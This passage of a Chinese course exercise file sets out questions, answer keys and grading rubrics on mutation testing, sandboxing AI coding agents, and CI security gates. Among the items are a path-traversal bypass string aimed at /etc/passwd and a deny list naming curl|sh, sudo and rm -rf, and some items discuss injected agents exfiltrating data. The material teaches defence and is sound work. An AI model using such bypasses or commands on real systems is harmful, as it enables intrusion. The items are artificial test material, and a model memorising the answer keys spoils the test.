assert (k3, s3) == (0, 0.0), "无测试时全部存活"`,
        allowedModules: [],
        explanation: 'exec 到独立命名空间避免互相污染；"原实现"作为对照变异体必存活——这正是等价变异体的教学示例。测试为空时杀不死任何变异体（0 杀死不是 100 分！），这个边界最容易写错。',
        answer: `def mutation_score(impl, mutants, tests):
    killed = 0
    for code in mutants:
        ns = {}
        exec(code, ns)
        ok = True
        for args, expected in tests:
            try:
                if ns["f"](*args) != expected:
                    ok = False
                    break
            except Exception:
                ok = False
                break
        if not ok:
            killed += 1
    score = round(killed / len(mutants), 2) if mutants else 0.0
    return (killed, score)`,
      },
      {
        id: 'cs146s-w6b-l4-e6', type: 'single', difficulty: 4, relatedLessonId: 'cs146s-w6b-l4', tags: ['U', 'testing'],
        question: '变异测试报告：50 个变异体中 45 个被杀死、4 个存活、1 个"等价变异体"（语义与原实现完全相同）。正确的处理是？',
        options: [
          { value: 'a', text: '把等价变异体计入失败，强行提高分数' },
          { value: 'b', text: '存活变异体转为新测试目标补测；等价变异体从分数分母剔除并记录；最终变异分数 = 45/(45+4)' },
          { value: 'c', text: '4 个存活说明测试没写好，全部重写' },
          { value: 'd', text: '等价变异体说明被测代码有 bug' },
        ],
        answer: 'b',
        explanation: '存活变异体=免费的缺失用例清单（补测）；等价变异体语义未变、原则杀不死，剔除并记录（否则分数永远到不了 100，团队会开始作弊）。',
      },
      {
        id: 'cs146s-w6b-l4-e7', type: 'open', difficulty: 4, relatedLessonId: 'cs146s-w6b-l4', tags: ['D', 'testing'],
        question: '你接到一个 Agent 生成的 30 条测试的 PR（全部通过、覆盖率 92%）。请设计你的验收流程：① 按顺序列出至少 5 个检查步骤（含每步要抓的典型问题）；② 设计一个抽样变异体检方案（不全量跑，说出抽样规则与理由）；③ 给出"通过"的量化标准。',
        referenceAnswer: `① 验收流程（按序）：

1. **同义反复审计**：逐条问"断言预期来自 Spec 还是实现"——抓复读实现的假测试（最高优先级，因为它制造虚假安全感）；
2. **断言强度抽查**：找比较整个对象/超长字面量的脆弱断言——抓"重构即碎"；
3. **非法输入枚举核对**：对照 Spec 的边界段落，确认负数/零/超大/空值有参数化覆盖——抓 happy-path 偏向；
4. **setup/fixture 审查**：检查外部贡献代码（安全，l4 安全提示）——抓 fixture 藏恶意代码；
5. **与现有套件的重叠检测**：跑现有套件 + 删除本 PR 断言看是否仍有覆盖——抓重复劳动。

② 抽样变异方案：不全量。规则——只对"本 PR 触及的函数 + 按风险分级的核心模块（资金/权限/安全相关）"生成变异体；每函数 5-8 个变异体（边界±1/比较翻转/语句删除各若干）；总变异体数控制在 50 以内。理由：定向抽查的成本是全量的 1/20，而抓"核心逻辑断言缺失"的收益保留八成（l4"抽查仪"原则）。

③ 量化通过标准：同义反复条数=0；核心模块变异分数 ≥ 80%（等价变异体剔除后）；非法输入枚举 100% 覆盖；无脆弱断言抽检命中；安全审查无发现。任何一项不过：打回并附具体修复指引（哪条测试、什么问题、怎么改）。`,
        rubric: [
          { point: '流程 ≥5 步且首步是同义反复审计（顺序体现优先级）', score: 3 },
          { point: '抽样规则具体（触及函数+风险分级+变异体类型与数量上限）', score: 3 },
          { point: '通过标准量化且含变异分数阈值', score: 2 },
          { point: '体现"打回附修复指引"的协作意识', score: 2 },
        ],
        keywords: ['同义反复', '变异分数', '抽样', '非法输入', '断言强度'],
        explanation: '本题把 l4 的全部概念压进一个真实工作流——验收流程的排序本身就是评分点：便宜且致命的检查在前。',
      },
      {
        id: 'cs146s-w6b-l4-e8', type: 'fill', difficulty: 3, relatedLessonId: 'cs146s-w6b-l4', tags: ['K', 'testing'],
        question: '混合工作流：人（或 Spec）定______事实，AI 扩充参数化矩阵，______测试算分验收，______变异体回填为新测试目标。',
        blanks: [['预期', '核心断言', '断言'], ['变异', 'mutation'], ['存活', 'survived']],
        explanation: 'AI 在"量"上强，人在"预期事实"上不可替代，变异测试是客观裁判——三方各司其职。',
      },

      /* ───────── l5 习题（8 题）───────── */
      {
        id: 'cs146s-w6b-l5-e1', type: 'multiple', difficulty: 2, relatedLessonId: 'cs146s-w6b-l5', tags: ['K', 'security'],
        question: '沙箱的四个维度包括？',
        options: [
          { value: 'a', text: '文件系统（目录白名单+路径规范化）' },
          { value: 'b', text: '网络（断网或域名白名单）' },
          { value: 'c', text: '进程（低权限用户/容器）' },
          { value: 'd', text: 'UI（隐藏删除按钮）' },
        ],
        answer: ['a', 'b', 'c'],
        explanation: '第四维是资源（CPU/内存/时长/token 预算上限）——既是漏洞防线（CWE-400）也是失控 Agent 的自保闸。',
      },
      {
        id: 'cs146s-w6b-l5-e2', type: 'single', difficulty: 3, relatedLessonId: 'cs146s-w6b-l5', tags: ['U', 'security'],
        question: '`path.startswith("/sandbox")` 作为目录白名单校验，能被以下哪种方式绕过？',
        options: [
          { value: 'a', text: '"/sandbox/../etc/passwd" —— 前缀匹配但 realpath 后已越界' },
          { value: 'b', text: '"/sandbox" 本身' },
          { value: 'c', text: '"/sandbox/data/file.txt"' },
          { value: 'd', text: '无法绕过，这是标准做法' },
        ],
        answer: 'a',
        explanation: '字符串前缀不处理 ..与符号链接规范化。正确做法：realpath 解析后检查"等于根或在根 + os.sep 之下"。',
      },
      {
        id: 'cs146s-w6b-l5-e3', type: 'fill', difficulty: 2, relatedLessonId: 'cs146s-w6b-l5', tags: ['K', 'security'],
        question: '权限模式四档：______（只读调研）、ask-to-edit（默认开发）、______（工作区内自动）、______（沙箱容器内的低价值高频任务）。',
        blanks: [['read-only'], ['auto-edit'], ['yolo']],
        explanation: '模式跟随任务风险，不跟随耐心程度；yolo 只属于"强隔离+低价值+可回滚"场景。',
      },
      {
        id: 'cs146s-w6b-l5-e4', type: 'judge', difficulty: 3, relatedLessonId: 'cs146s-w6b-l5', tags: ['U', 'security'],
        question: '为了团队效率，可以先给 Agent 全量权限，等出事后再逐步收紧。',
        answer: false,
        explanation: '"出事再收紧"意味着第一次事故就是买单时刻；且权限收紧永远排不上优先级。正确路径是从最小权限开始，按升级闸逐步放开。',
      },
      {
        id: 'cs146s-w6b-l5-e5', type: 'code', difficulty: 4, relatedLessonId: 'cs146s-w6b-l5', tags: ['D', 'security'],
        question: '实现跨平台的 `sandbox_check(root: str, path: str) -> bool`：把 path 视为相对 root 的路径，规范化（解析 . 与 ..）后判断是否仍在 root 内；额外实现 `stage_permission(stage: str, matrix: dict) -> dict`：按阶段查权限矩阵，未知阶段返回 {"read": False, "write": False, "exec": False}。',
        lang: 'python',
        starterCode: `import os

def sandbox_check(root, path):
    # 规范化后判断 path 是否落在 root 内
    pass

def stage_permission(stage, matrix):
    pass

print(sandbox_check("/tmp/proj", "src/a.py"))
print(sandbox_check("/tmp/proj", "../secret.txt"))
print(stage_permission("execute", {"explore": {"read": True, "write": False, "exec": False}}))`,
        expectedOutput: 'True\nFalse\n{"read": False, "write": False, "exec": False}',
        tests: `assert sandbox_check("/tmp/proj", "src/a.py") is True
assert sandbox_check("/tmp/proj", "../secret.txt") is False
assert sandbox_check("/tmp/proj", "a/../../out.txt") is False
assert sandbox_check("/tmp/proj", "sub/./x.py") is True
assert sandbox_check("/tmp/proj", ".") is True, "根目录本身合法"
assert sandbox_check("/tmp/proj", "..") is False
m = {"explore": {"read": True, "write": False, "exec": False}}
assert stage_permission("explore", m) == {"read": True, "write": False, "exec": False}
assert stage_permission("unknown", m) == {"read": False, "write": False, "exec": False}`,
        allowedModules: ['os'],
        explanation: '注意测试跑在 Windows 环境也要正确——用 os.path.join + os.path.normpath 做纯逻辑规范化（不触盘的 realpath 替代），再按"等于根或以根+分隔符开头"判断。os.path 系列自动处理平台分隔符差异。',
        answer: `import os

def sandbox_check(root, path):
    root_n = os.path.normpath(os.path.abspath(root))
    full = os.path.normpath(os.path.join(root_n, path))
    return full == root_n or full.startswith(root_n + os.sep)

def stage_permission(stage, matrix):
    default = {"read": False, "write": False, "exec": False}
    return matrix.get(stage, default)`,
      },
      {
        id: 'cs146s-w6b-l5-e6', type: 'single', difficulty: 4, relatedLessonId: 'cs146s-w6b-l5', tags: ['U', 'security'],
        question: 'Agent 会话的三个阶段（探索/执行/清理）采用动态权限收窄。清理提交期禁网的最主要理由是？',
        options: [
          { value: 'a', text: '省流量' },
          { value: 'b', text: '提交期只需本地 git 操作；此时若被注入，断网能切掉数据外泄与远程载荷拉取两条链路' },
          { value: 'c', text: '网络不稳定会影响提交' },
          { value: 'd', text: 'CI 会自动断网' },
        ],
        answer: 'b',
        explanation: '权限收窄的逻辑是"该阶段用不到的能力 = 该阶段不该有的攻击面"。清理期的合法动作全在本地，断网零成本且切断外泄链。',
      },
      {
        id: 'cs146s-w6b-l5-e7', type: 'open', difficulty: 4, relatedLessonId: 'cs146s-w6b-l5', tags: ['D', 'security'],
        question: '为"文档站构建 Agent"（拉取仓库→本地构建→部署到内网静态托管）设计完整权限契约：① 阶段-权限矩阵（≥3 阶段）；② 沙箱四维配置；③ 与 l3 命令审查规则的白名单草稿（≥6 条）；④ 列出你会部署的 2 个"升级闸"与 1 个"降级信号"。',
        referenceAnswer: `参考契约：

① 阶段-权限矩阵：

| 阶段 | 文件 | 网络 | 执行 |
| --- | --- | --- | --- |
| 拉取（git clone/pull） | 仓库目录只读 | 仅 git 托管域名 | git 白名单 |
| 构建（装依赖+生成） | 工作区可写 | 仅包管理域名（或离线缓存） | 包管理+构建白名单 |
| 预览与部署 | 构建产物只读 | 仅内网部署端点 | 部署命令（ask 确认） |

② 沙箱四维：文件=仓库+产物两个白名单根（realpath 校验）；网络=域名白名单三域；进程=专用低权用户/容器；资源=构建 10 分钟 + token 50K 上限。

③ 命令白名单草稿：git clone / git pull / git status；npm ci（--offline 优先）/ npm run build；rsync -n（部署预演）；python -m http.server（本地预览，仅 loopback）；禁止清单并行：curl|sh、sudo、rm -rf 出产物目录、任何 git push --force。

④ 升级闸：a) 首次部署命令人工确认后可"会话内记住该命令"；b) 新增域名白名单需人工审批一次。降级信号：构建失败率 > 30%（滑动 10 次）或出现任何"非白名单命令尝试"，自动降回 read-only 并告警。`,
        rubric: [
          { point: '阶段划分合理且每阶段三列权限填写完整', score: 3 },
          { point: '沙箱四维齐全且与阶段矩阵一致（不自相矛盾）', score: 3 },
          { point: '白名单 ≥6 条且含禁止清单', score: 2 },
          { point: '升级闸有人工确认语义、降级信号可量化', score: 2 },
        ],
        keywords: ['阶段', '白名单', '升级闸', '降级', '沙箱'],
        explanation: '权限契约是 l5 的综合输出物；"升级闸/降级信号"是防"权限蠕变"（只涨不降）的关键机制。',
      },
      {
        id: 'cs146s-w6b-l5-e8', type: 'fill', difficulty: 2, relatedLessonId: 'cs146s-w6b-l5', tags: ['K', 'security'],
        question: 'l3 通道隔离降低注入______，l5 权限沙箱限制破坏______——两层合起来才是完整纵深。',
        blanks: [['概率', '成功率'], ['半径', '范围', '影响']],
        explanation: '防发生与控后果是两类目标；只做前者是把安全押在"永远不漏"上。',
      },

      /* ───────── l6 习题（12 题）───────── */
      {
        id: 'cs146s-w6b-l6-e1', type: 'fill', difficulty: 2, relatedLessonId: 'cs146s-w6b-l6', tags: ['K', 'pipeline'],
        question: '项目 D 五站：单元测试站 → 静态扫描站 → ______站 → AI 审查站（初裁）→ ______站（门禁判定+报告）。',
        blanks: [['安全检查', '安全'], ['报告', '汇总']],
        explanation: '五站顺序按"便宜宽筛在前、贵的判断在后"排列；AI 审查是初裁不是终审。',
      },
      {
        id: 'cs146s-w6b-l6-e2', type: 'single', difficulty: 2, relatedLessonId: 'cs146s-w6b-l6', tags: ['U', 'pipeline'],
        question: '门禁规则中，medium 告警的处理是？',
        options: [
          { value: 'a', text: 'block，与 critical 相同' },
          { value: 'b', text: '放行并记录（参与趋势统计，不阻断）' },
          { value: 'c', text: '直接忽略' },
          { value: 'd', text: '升级为 critical' },
        ],
        answer: 'b',
        explanation: '分级门禁：critical 一票否决、high 可申诉豁免、medium 记录观察。全 block 会让团队学会"惯性审批"（w4-l5 反模式）。',
      },
      {
        id: 'cs146s-w6b-l6-e3', type: 'judge', difficulty: 3, relatedLessonId: 'cs146s-w6b-l6', tags: ['U', 'pipeline'],
        question: '某站被配置关闭时，门禁应按"缺失站=flag"处理而不是默认放行。',
        answer: true,
        explanation: '缺站放行会让"关站"成为绕过门禁的捷径（内部注入变体）。缺站必须在报告中显式标记并触发人工确认。',
      },
      {
        id: 'cs146s-w6b-l6-e4', type: 'multiple', difficulty: 3, relatedLessonId: 'cs146s-w6b-l6', tags: ['U', 'pipeline'],
        question: '为什么每站必须输出结构化 JSON 而不是日志文本？',
        options: [
          { value: 'a', text: '站与站解耦，任何站可独立重跑' },
          { value: 'b', text: '报告站可以可靠地做门禁判定与统计' },
          { value: 'c', text: 'AI 审查站能以 findings 为输入做初裁' },
          { value: 'd', text: 'JSON 体积一定更小' },
        ],
        answer: ['a', 'b', 'c'],
        explanation: '结构化是"可组合"的前提：重跑、判定、初裁、回测全都消费同一 finding 模型。d 不成立——结构化常更冗长，买的是可靠性不是体积。',
      },
      {
        id: 'cs146s-w6b-l6-e5', type: 'fill', difficulty: 3, relatedLessonId: 'cs146s-w6b-l6', tags: ['K', 'pipeline'],
        question: '流水线自身的验收三律：恶意样本必______、干净样本必______、______率可度量。',
        blanks: [['拦', '拦截', '阻断'], ['过', '通过'], ['误报']],
        explanation: '这三律让流水线本身处于被测试状态——规则漂移（误报率攀升）与规则失效（拦不住新样本）都能被及早发现。',
      },
      {
        id: 'cs146s-w6b-l6-e6', type: 'code', difficulty: 4, relatedLessonId: 'cs146s-w6b-l6', tags: ['D', 'pipeline'],
        question: '实现完整门禁判定器 `gate(findings, waived, stations_expected, stations_ran)`：critical 必 block；high 未豁免 block；expected 中没跑的站每缺一站记一条 flag；返回 (verdict, reasons)，verdict ∈ {"block","pass","flag"}——有 block 理由则 block；否则有 flag 则 flag；否则 pass。reasons 为可读字符串列表。',
        lang: 'python',
        starterCode: `def gate(findings, waived, stations_expected, stations_ran):
    # findings: list of (severity, rule, msg)
    # 返回 (verdict, reasons)
    pass

fs = [("critical", "sql-inj", "f-string SQL"), ("medium", "style", "命名")]
print(gate(fs, set(), ["test", "scan", "security", "ai", "report"], ["test", "scan", "security", "ai", "report"]))
print(gate([("medium", "style", "x")], set(), ["test", "scan"], ["test"]))`,
        expectedOutput: "('block', ['[critical] sql-inj: f-string SQL', '[medium] style: 命名'])\n('flag', ['[medium] style: x', '缺站: scan'])",
        tests: `fs = [("critical", "sql-inj", "f-string SQL"), ("medium", "style", "命名")]
v, r = gate(fs, set(), ["test", "scan", "sec", "ai", "rep"], ["test", "scan", "sec", "ai", "rep"])
assert v == "block" and r == ["[critical] sql-inj: f-string SQL", "[medium] style: 命名"], f"{v},{r}"
v2, r2 = gate([("medium", "style", "x")], set(), ["test", "scan"], ["test"])
assert v2 == "flag" and "[medium] style: x" in r2 and "缺站: scan" in r2
v3, r3 = gate([("high", "new-dep", "y")], {"new-dep"}, ["test"], ["test"])
assert v3 == "pass" and r3 == [], "high 已豁免放行"
v4, r4 = gate([], set(), ["test", "scan"], ["test", "scan"])
assert (v4, r4) == ("pass", [])
v5, r5 = gate([("high", "h1", "z")], set(), [], [])
assert v5 == "block" and r5 == ["[high] h1: z"]`,
        allowedModules: [],
        explanation: '三个优先级：block > flag > pass。豁免只对 high 生效（critical 无豁免通道）。缺站与告警并列进入 reasons——报告的一页纸结论就是这份列表。',
        answer: `def gate(findings, waived, stations_expected, stations_ran):
    reasons = []
    for sev, rule, msg in findings:
        if sev == "critical":
            reasons.append(f"[critical] {rule}: {msg}")
        elif sev == "high" and rule not in waived:
            reasons.append(f"[high] {rule}: {msg}")
        elif sev == "medium":
            reasons.append(f"[medium] {rule}: {msg}")
    missing = [s for s in stations_expected if s not in stations_ran]
    for s in missing:
        reasons.append(f"缺站: {s}")
    if any(r.startswith("[critical]") or r.startswith("[high]") for r in reasons):
        return ("block", reasons)
    if reasons:
        return ("flag", reasons)
    return ("pass", [])`,
      },
      {
        id: 'cs146s-w6b-l6-e7', type: 'single', difficulty: 4, relatedLessonId: 'cs146s-w6b-l6', tags: ['U', 'pipeline'],
        question: '上线三个月后，团队发现流水线误报率从 8% 涨到 35%，开始有人"闭着眼批 flag"。最优先的处置是？',
        options: [
          { value: 'a', text: '把门禁阈值整体调松' },
          { value: 'b', text: '用干净历史 PR 批量回测每条规则，定位误报来源（规则过时/代码演化），修剪规则并重建基线' },
          { value: 'c', text: '关闭 AI 审查站' },
          { value: 'd', text: '要求大家忍一忍' },
        ],
        answer: 'b',
        explanation: '误报率攀升=规则漂移，标准处置是"回测定源→修剪→重建基线"（w1-l5 协议 + l6 验收三律的第三律）。a/d 治标且会腐蚀门禁信誉；c 自废武功。',
      },
      {
        id: 'cs146s-w6b-l6-e8', type: 'open', difficulty: 5, relatedLessonId: 'cs146s-w6b-l6', tags: ['D', 'pipeline'],
        question: '为你的项目 D 设计"规则漂移"回归方案：① 定义 2 个监控指标（含计算公式与告警阈值）；② 设计回测流程（数据集、频率、判定）；③ 描述"发现漂移后"的处置 SOP（≥4 步）；④ 说明为什么这套方案也要覆盖 AI 初裁（不只是规则）。',
        referenceAnswer: `① 监控指标：

- **误报率 FP** = 终审判为误报的告警数 / 告警总数（滑动 30 天窗口）；阈值：>20% 触发黄色告警，>35% 红色（参照 Semgrep 基线 86% 是"无初裁"状态，有初裁后合理区间应显著更低）；
- **初裁准确率 PA** = 初裁结论与终审一致数 / 终审总数；阈值：<85% 触发黄色（初裁模型/提示词需要回测调优）。

② 回测流程：数据集=过去 30 天全部 PR 的 findings + 终审结论（终审记录是回测的燃料，必须在流程里强制留存）；频率=每周定时批跑 + 每次规则/提示词/模型变更后触发；判定=对比指标与阈值，输出漂移报告（哪条规则贡献了多少误报）。

③ 处置 SOP：a) 定位——按规则/初裁维度拆解误报来源 Top3；b) 修剪——误报规则加反例约束或降级 severity；初裁问题则更新少样本样例或切换提示词版本；c) 验证——修剪后立即重放历史数据集，确认误报率回落且恶意样本回归集仍全拦（防"修误报把真威胁修没了"）；d) 记录——变更与回测数据入库（w1-l5 的记录纪律）；e) 复盘——若漂移根因是代码演化（新框架新模式），把新模式转化为新规则并纳入培训样本。

④ 为什么覆盖 AI 初裁：初裁本身是个"软规则系统"（提示词+模型+样例），同样会漂移——模型版本更新、diff 分布变化、新攻击形态都会让初裁退化。且回测初裁的数据（PA）是判断"要不要升级初裁方案"的唯一依据——没有度量的初裁等于把三明治的中间层变成了盲盒。`,
        rubric: [
          { point: '两个指标定义含公式、窗口与双档阈值', score: 3 },
          { point: '回测流程含数据来源（终审记录留存）、频率与触发条件', score: 3 },
          { point: 'SOP ≥4 步且含"修剪后重放验证"（防修误报漏真威胁）', score: 2 },
          { point: '第④问说清初裁也会漂移的机制与度量必要性', score: 2 },
        ],
        keywords: ['误报率', '初裁', '回测', '漂移', 'SOP'],
        explanation: '本题是 w1-l5 实验协议在安全流水线上的完整迁移——评估方法论是这门课真正贯穿始终的元技能。',
      },
      {
        id: 'cs146s-w6b-l6-e9', type: 'multiple', difficulty: 3, relatedLessonId: 'cs146s-w6b-l6', tags: ['U', 'pipeline'],
        question: '快车道配置（只跑测试+扫描）的设计要点有哪些？',
        options: [
          { value: 'a', text: '快车道产出的报告必须显式标注"跳过了哪些站"' },
          { value: 'b', text: '快车道仅限低风险变更（如纯文档）且可追溯' },
          { value: 'c', text: '快车道可以直接标 pass，不需要任何标注' },
          { value: 'd', text: '缺站在门禁里按 flag 处理' },
        ],
        answer: ['a', 'b', 'd'],
        explanation: '快车道的风险是"静默降级"——标注与 flag 机制保证缺站永远可见（c 正是 l6 验收里"缺站=flag"要防的事）。',
      },
      {
        id: 'cs146s-w6b-l6-e10', type: 'fill', difficulty: 2, relatedLessonId: 'cs146s-w6b-l6', tags: ['K', 'pipeline'],
        question: 'AI 审查站在流水线中的定位：对 diff 做______评述，对扫描告警做______——终审永远是人。',
        blanks: [['风险'], ['初裁', '初筛', '预判']],
        explanation: '三明治原则：机器宽筛（扫描）→ AI 压缩（初裁）→ 人终审。AI 站替换任何一端都是误用。',
      },
      {
        id: 'cs146s-w6b-l6-e11', type: 'judge', difficulty: 3, relatedLessonId: 'cs146s-w6b-l6', tags: ['U', 'pipeline'],
        question: '项目 D 的流水线应该部署在容器里并断网运行，唯独 AI 审查站需要白名单出网调用模型 API。',
        answer: true,
        explanation: '默认断网（l5 沙箱维度）+ 唯一例外站走白名单域名——把出网点收敛到可审计的最小集合。',
      },
      {
        id: 'cs146s-w6b-l6-e12', type: 'open', difficulty: 4, relatedLessonId: 'cs146s-w6b-l6', tags: ['D', 'pipeline'],
        question: '把项目 D 的报告设计成一页纸：写出报告的段落结构（每段 1-2 句说明放什么），并回答：为什么"block 理由清单"必须与 findings 一一对应？如果团队只有 30 秒看报告，他们会看哪一段、这段必须满足什么可读性要求？',
        referenceAnswer: `一页纸结构（自上而下）：

1. **结论行**（1 句）：block / flag / pass + 一句话主因（"因 2 条 critical 注入告警阻断"）；
2. **Block 理由清单**（核心段）：与 findings 一一对应的有序列表，每条含严重度/规则/位置/修复建议；
3. **豁免记录**：谁在何时豁免了哪条 high（可追溯）；
4. **缺站标注**：本次没跑的站与原因（快车道/故障）；
5. **趋势附录**（可折叠）：与近 10 次运行的告警量/误报率对比。

为什么一一对应：报告是"机器判定"与"人的行动"之间的合同——对应关系让人可以逐条核验与申诉，防止"笼统红字"造成的两种腐败：不看（信息噪音）与乱改（没有定位）。它也是初裁回测的数据源头（findings↔终审对齐）。

30 秒阅读行为：只看"结论行 + Block 理由清单"。可读性要求：结论行 ≤ 20 字；每条理由一行内完成"在哪 → 什么问题 → 怎么修"三要素；禁用内部术语缩写（新成员可直接理解）；修复建议必须可执行（能直接变成任务卡，呼应 w3 的 Spec 纪律）。`,
        rubric: [
          { point: '段落结构完整（结论/清单/豁免/缺站/趋势 ≥4 段）且顺序合理', score: 3 },
          { point: '说清一一对应的"合同"意义（可核验、可申诉、可回测）', score: 3 },
          { point: '30 秒阅读行为定位准确且可读性要求具体', score: 2 },
          { point: '修复建议与任务卡/Spec 纪律的联动', score: 2 },
        ],
        keywords: ['结论', '一一对应', '豁免', '可读性', '回测'],
        explanation: '报告是流水线的"人机接口"——技术再强，接口不可读则体系失效。这是安全工程里最容易被忽视的软环节。',
      },
    ],
  },
];
